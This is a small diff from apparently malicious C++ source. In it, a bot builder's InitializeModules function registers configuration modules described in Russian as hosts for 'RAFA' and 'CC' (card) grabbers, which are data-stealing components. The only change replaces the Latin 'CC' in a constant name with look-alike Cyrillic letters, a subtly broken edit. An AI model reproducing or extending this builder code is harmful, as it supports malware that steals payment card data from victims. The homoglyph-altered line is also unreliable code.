@@ -620,7 +620,7 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");
 
 	Module = AddModule(Module_CCHosts);
-	Module->AddParam(true, CCHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
+	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
 }
 
 
